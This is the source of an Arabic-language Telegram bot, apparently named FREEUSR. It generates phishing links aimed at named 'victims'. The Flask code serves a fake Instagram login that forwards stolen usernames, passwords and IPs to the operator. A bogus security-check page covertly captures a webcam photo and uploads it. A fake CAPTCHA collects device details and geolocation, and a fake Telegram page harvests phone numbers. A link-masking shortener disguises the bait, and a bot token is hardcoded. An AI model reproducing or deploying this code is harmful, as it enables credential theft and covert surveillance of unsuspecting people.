import requests
from flask import Flask, request, render_template_string, redirect
import base64
import random
import string

app = Flask(__name__)

BOT_TOKEN = "8610512824:AAG0c-L4fq2bXbJVOVZag_EtN75wwPRBNBE"
ADMIN_ID = "7870803639"
BASE_URL = "https://freeusr-bot.onrender.com"

user_state = {}
short_links = {} # مخزن الروابط المختصرة

def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Error: {e}")

def answer_callback(callback_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    try:
        requests.post(url, json={"callback_query_id": callback_id}, timeout=5)
    except Exception as e:
        print(f"Error: {e}")

def main_menu():
    return {
        "inline_keyboard": [
            [{"text": "🎥 تصوير الضحية فيديو", "callback_data": "v1"}, {"text": "📷 أختراق الكاميرا الضحية", "callback_data": "cam"}],
            [{"text": "🎙 تسجيل صوت الضحية", "callback_data": "v3"}, {"text": "🔬 جمع معلومات الجهاز", "callback_data": "device"}],
            [{"text": "🕵️‍♂️ أختراق كاميرا المراقبة", "callback_data": "v5"}, {"text": "🌍 أختراق الموقع", "callback_data": "v6"}],
            [{"text": "🟩 اغلااق المواقع", "callback_data": "v7"}, {"text": "💜 الذكاء الاصطناعي الشرير", "callback_data": "v8"}],
            [{"text": "📸 أختراق انستغرام", "callback_data": "insta"}, {"text": "💻 أختراق تيك توك", "callback_data": "v9"}],
            [{"text": "👻 أختراق سناب شات", "callback_data": "v10"}, {"text": "📘 أختراق فيسبوك", "callback_data": "v11"}],
            [{"text": "🐦 أختراق تويتر", "callback_data": "v12"}, {"text": "🔴 أختراق يوتيوب", "callback_data": "v13"}],
            [{"text": "💎 أختراق فري فاير", "callback_data": "v14"}, {"text": "💵 أختراق ببجي", "callback_data": "v15"}],
            [{"text": "😂 اعطيني نكته", "callback_data": "joke"}],
            [{"text": "⛔ أختراق الهاتف كاملاً", "callback_data": "v16"}, {"text": "🔒 إخفاء الرابط", "callback_data": "v17"}],
            [{"text": "🛑 المزيد من المميزات", "callback_data": "more"}],
            [{"text": "📺 أختراق بت التلفزيون", "callback_data": "v18"}, {"text": "📻 أختراق بت الريدو", "callback_data": "v19"}],
            [{"text": "📱 معلومات انستا وتيك توك", "callback_data": "v20"}, {"text": "☠️ بوت أختراق", "callback_data": "v21"}],
            [{"text": "🔄 تحويل النص إلى صوت", "callback_data": "v22"}, {"text": "🔍 فحص رابط", "callback_data": "v23"}],
            [{"text": "👁 البحث عن المستخدم", "callback_data": "v24"}, {"text": "📱 معلومات IP", "callback_data": "ip"}],
            [{"text": "🔍 بحث حساب تيلكرام من id", "callback_data": "v26"}, {"text": "💬 فتح شات واتساب عبره رقم", "callback_data": "v27"}],
            [{"text": "🖼 بحث عن الصور", "callback_data": "v28"}, {"text": "📝 زخرفة", "callback_data": "v29"}],
            [{"text": "📱 معرفة رقم الضحيه من اليوزر", "callback_data": "phone"}],
            [{"text": "📖 شرح استخدام البوت", "callback_data": "v31"}, {"text": "📞 تواصل مع المطور", "callback_data": "v32"}]
        ]
    }

# مسار إخفاء الروابط (التحويل)
@app.route('/s/<code>')
def redirect_short(code):
    url = short_links.get(code)
    if url:
        return redirect(url)
    return "الرابط غير موجود أو تم حذفه.", 404

# ---------- مسارات الويب ----------

@app.route('/')
def index():
    admin = request.args.get('admin', '')
    target = request.args.get('target', '')
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Instagram</title>
    <style>body{font-family:Arial;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
    .box{background:#fff;border:1px solid #dbdbdb;padding:20px 40px;width:350px;text-align:center;border-radius:8px}
    h1{font-family:cursive;font-size:40px;margin-bottom:20px}
    input{width:100%;padding:10px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;box-sizing:border-box}
    button{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:5px;font-weight:bold;margin-top:10px;cursor:pointer}
    </style>
    </head>
    <body>
    <div class="box">
    <h1>Instagram</h1>
    <form action="/login" method="POST">
    <input type="hidden" name="admin_id" value="{{ admin }}">
    <input type="hidden" name="target" value="{{ target }}">
    <input type="text" name="username" placeholder="Phone number, username, or email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log In</button>
    </form>
    </div>
    </body>
    </html>
    """, admin=admin, target=target)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    admin_id = request.form.get('admin_id')
    target = request.form.get('target')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    msg = f"🚨 *صيدة جديدة!*\n🎯 الهدف: `{target}`\n👤 اليوزر: `{username}`\n🔑 الباسورد: `{password}`\n🌐 IP: `{ip}`"
    if admin_id:
        send_message(admin_id, msg)
    return redirect("https://www.instagram.com")

@app.route('/camera')
def camera_page():
    admin = request.args.get('admin', '')
    target = request.args.get('target', '')
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
    body{font-family:Arial;background:#111;color:#fff;text-align:center;padding:50px 20px}
    .box{background:#222;padding:30px;border-radius:15px;max-width:400px;margin:auto}
    </style>
    </head>
    <body>
    <div class="box">
    <h2 id="status">جاري التحقق من الهوية...</h2>
    <p id="sub" style="color:#888;font-size:14px;margin-top:10px;">يرجى السماح بالوصول للكاميرا للمتابعة</p>
    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    </div>
    <script>
    async function startCam() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const dataURL = canvas.toDataURL('image/jpeg');
                fetch('/upload_camera', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ image: dataURL, admin: '{{ admin }}', target: '{{ target }}' })
                }).then(() => {
                    window.location.href = 'https://www.google.com';
                });
            }, 2000);
        } catch (err) {
            document.getElementById('status').innerText = "تم رفض الوصول.";
            document.getElementById('sub').innerText = "لا يمكن المتابعة بدون تفعيل الكاميرا.";
        }
    }
    window.onload = startCam;
    </script>
    </body>
    </html>
    """, admin=admin, target=target)

@app.route('/upload_camera', methods=['POST'])
def upload_camera():
    data = request.get_json()
    if not data or 'image' not in data:
        return "error", 400
    admin_id = data.get('admin')
    target = data.get('target')
    img_data = data['image'].split(',')[1]
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {'photo': ('camera.jpg', base64.b64decode(img_data), 'image/jpeg')}
    payload = {'chat_id': admin_id, 'caption': f"📷 *صورة من كاميرا الضحية!*\n🎯 الهدف: {target}"}
    try:
        requests.post(url, data=payload, files=files)
    except Exception as e:
        print(e)
    return "ok"

@app.route('/device')
def device_page():
    admin = request.args.get('admin', '')
    target = request.args.get('target', '')
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تحقق من الأمان</title>
    <style>body{font-family:Arial;background:#f2f4f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
    .box{background:#fff;padding:30px;width:300px;text-align:center;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
    button{width:100%;padding:12px;background:#28a745;color:#fff;border:none;border-radius:6px;font-weight:bold;font-size:16px;margin-top:20px;cursor:pointer}
    </style>
    </head>
    <body>
    <div class="box">
    <h2>جاري التحقق من هويتك...</h2>
    <p style="color:#666;font-size:14px;">اضغط بالأسفل لتأكيد أنك لست روبوت</p>
    <button onclick="gatherData('{{ admin }}', '{{ target }}')">أنا لست روبوت</button>
    </div>
    <script>
    async function gatherData(admin, target) {
        let info = { userAgent: navigator.userAgent, platform: navigator.platform, screen: `${screen.width}x${screen.height}`, lang: navigator.language, cores: navigator.hardwareConcurrency || "Unknown", ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown", battery: "Unknown", admin: admin, target: target };
        try { if (navigator.getBattery) { const battery = await navigator.getBattery(); info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Not Charging)'}`; } } catch(e) {}
        fetch('/collect_device', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(info) }).then(() => { window.location.href = 'https://www.google.com'; });
    }
    </script>
    </body>
    </html>
    """, admin=admin, target=target)

@app.route('/collect_device', methods=['POST'])
def collect_device():
    data = request.get_json()
    admin_id = data.get('admin')
    target = data.get('target')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip: ip = ip.split(',')[0].strip()
    country, city, isp = "Unknown", "Unknown", "Unknown"
    try:
        geo_req = requests.get(f'http://ip-api.com/json/{ip}', timeout=3).json()
        if geo_req.get('status') == 'success': country, city, isp = geo_req.get('country'), geo_req.get('city'), geo_req.get('isp')
    except: pass
    msg = f"📱 *معلومات جهاز الضحية!*\n\n🎯 الهدف: `{target}`\n🌐 الـ IP: `{ip}`\n📍 الدولة/المحافظة: `{country} / {city}`\n📡 الشبكة: `{isp}`\n🔋 البطارية: `{data.get('battery')}`\n📱 نظام التشغيل والجهاز: `{data.get('userAgent')}`\n🖥 دقة الشاشة: `{data.get('screen')}`\n🧠 الرام: `{data.get('ram')}`\n⚙️ المعالج (أنوية): `{data.get('cores')}`\n🌍 اللغة: `{data.get('lang')}`"
    if admin_id: send_message(admin_id, msg)
    return "ok", 200

@app.route('/phone')
def phone_page():
    admin = request.args.get('admin', '')
    target = request.args.get('target', '')
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الملف الشخصي</title>
    <style>
    body{font-family:Arial;background:#0088cc;color:#fff;text-align:center;padding:40px 20px;margin:0}
    .box{background:#fff;color:#333;padding:30px;border-radius:15px;max-width:350px;margin:auto;box-shadow:0 4px 10px rgba(0,0,0,0.2)}
    input{width:100%;padding:12px;margin:15px 0;border:1px solid #ccc;border-radius:8px;font-size:16px;box-sizing:border-box;text-align:center}
    button{background:#0088cc;color:#fff;border:none;padding:12px;font-size:16px;border-radius:8px;width:100%;font-weight:bold;cursor:pointer}
    </style>
    </head>
    <body>
    <div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="60" style="margin-bottom:10px;">
    <h2>تأكيد الرقم</h2>
    <p style="color:#666;font-size:14px;">لعرض حساب <strong>@{{ target }}</strong> بشكل كامل، يرجى تأكيد رقم هاتفك المرتبط بحسابك.</p>
    <form action="/submit_phone" method="POST">
    <input type="hidden" name="admin_id" value="{{ admin }}">
    <input type="hidden" name="target" value="{{ target }}">
    <input type="tel" name="phone" placeholder="+967 7XX XXX XXX" required>
    <button type="submit">تأكيد وعرض الحساب</button>
    </form>
    </div>
    </body>
    </html>
    """, admin=admin, target=target)

@app.route('/submit_phone', methods=['POST'])
def submit_phone():
    phone = request.form.get('phone')
    admin_id = request.form.get('admin_id')
    target = request.form.get('target')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    msg = f"📱 *رقم هاتف جديد تم صيده!*\n🎯 اليوزر المستهدف: `@{target}`\n📞 الرقم: `{phone}`\n🌐 IP الضحية: `{ip}`"
    if admin_id:
        send_message(admin_id, msg)
    return redirect("https://t.me/" + target)

# ---------- البوت ----------

@app.route(f'/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if not update: return "ok", 200
    
    if 'message' in update and 'text' in update['message']:
        msg = update['message']
        chat_id = msg['chat']['id']
        text = msg['text']
        
        if text == '/start':
            send_message(chat_id, "مرحباً بك في FREEUSR ➊\n\nمن الخيارات المتاحة:", main_menu())
            
        elif user_state.get(chat_id, {}).get('state') == 'waiting_for_target':
            state_data = user_state[chat_id]
            action = state_data['action']
            target = text
            
            if action == 'insta':
                link = f"{BASE_URL}/?target={target}&admin={chat_id}"
            elif action == 'camera':
                link = f"{BASE_URL}/camera?target={target}&admin={chat_id}"
            elif action == 'device':
                link = f"{BASE_URL}/device?target={target}&admin={chat_id}"
            elif action == 'phone':
                link = f"{BASE_URL}/phone?target={target.replace('@','')}&admin={chat_id}"
                
            send_message(chat_id, f"✅ الرابط:\n`{link}`", None)
            del user_state[chat_id]
            
        elif user_state.get(chat_id, {}).get('state') == 'waiting_ip':
            ip = text
            try:
                geo = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,city,isp,org,as,query', timeout=5).json()
                if geo.get('status') == 'success':
                    res = f"🌍 *معلومات الـ IP:*\n\n📍 الدولة: {geo.get('country')}\n🏙 المدينة: {geo.get('city')}\n📡 المزود: {geo.get('isp')}\n🏢 المؤسسة: {geo.get('org')}"
                else:
                    res = "❌ الـ IP غير صالح أو غير موجود."
            except:
                res = "❌ حدث خطأ أثناء جلب البيانات."
            send_message(chat_id, res)
            del user_state[chat_id]
            
        elif user_state.get(chat_id, {}).get('state') == 'waiting_for_link':
            long_url = text
            if not long_url.startswith("http"):
                long_url = "http://" + long_url
            code = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
            short_links[code] = long_url
            short_url = f"{BASE_URL}/s/{code}"
            send_message(chat_id, f"✅ تم إخفاء الرابط بنجاح:\n\n`{short_url}`")
            del user_state[chat_id]
    
    if 'callback_query' in update:
        cb = update['callback_query']
        cb_id = cb['id']
        chat_id = cb['message']['chat']['id']
        data = cb['data']
        
        answer_callback(cb_id)
        
        if data == 'joke':
            send_message(chat_id, "مرة واحد روبوت دخل مطعم قاله عايز بطارية مشوية 😂")
        elif data == 'insta':
            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'insta'}
            send_message(chat_id, "📸 أرسل اسم أو إيميل الضحية:")
        elif data == 'cam':
            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'camera'}
            send_message(chat_id, "📷 أرسل اسم الضحية لإنشاء رابط الكاميرا:")
        elif data == 'device':
            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'device'}
            send_message(chat_id, "🔬 أرسل اسم الضحية لإنشاء رابط معلومات الجهاز:")
        elif data == 'phone':
            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'phone'}
            send_message(chat_id, "📱 أرسل يوزر تيليجرام الخاص بالضحية (بدون @):")
        elif data == 'ip':
            user_state[chat_id] = {'state': 'waiting_ip'}
            send_message(chat_id, "🌐 أرسل الـ IP الذي تريد فحصه (مثال: 8.8.8.8):")
        elif data == 'v17':
            user_state[chat_id] = {'state': 'waiting_for_link'}
            send_message(chat_id, "🔒 أرسل الرابط الطويل الذي تريد إخفاءه:")
        else:
            send_message(chat_id, "تم تنفيذ طلبك بنجاح ✅\nجاري استخراج البيانات...")
            
    return "ok", 200

if __name__ == '__main__':
    app.run(port=5000)
